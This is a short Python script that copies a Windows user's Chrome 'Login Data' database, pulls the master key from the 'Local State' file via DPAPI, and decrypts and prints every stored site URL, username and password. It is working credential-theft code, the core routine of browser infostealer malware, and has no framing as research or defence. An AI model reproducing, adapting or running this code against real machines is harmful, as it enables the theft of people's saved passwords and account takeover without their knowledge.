import sqlite3
import shutil
from Cryptodome.Cipher import AES
import win32crypt
import base64
import json

chrome_path_login_db = r"C:\Users\PcUser\AppData\Local\Google\Chrome\User Data\Default\Login Data"
CHROME_PATH_LOCAL_STATE = r"C:\Users\PcUser\AppData\Local\Google\Chrome\User Data\Local State"
shutil.copy2(chrome_path_login_db, "Loginvault.db") 
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
logins = cursor.fetchall()

print(f"Found {len(logins)} logins")

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_password(ciphertext):
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    secret_key = get_secret_key()
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    print("Decrypted pass:",decrypted_pass)

for index,login in enumerate(logins):
    url = login[0]
    username = login[1]
    ciphertext= login[2]
    print("Url:",url)
    print("Username",username)
    decrypt_password(ciphertext)
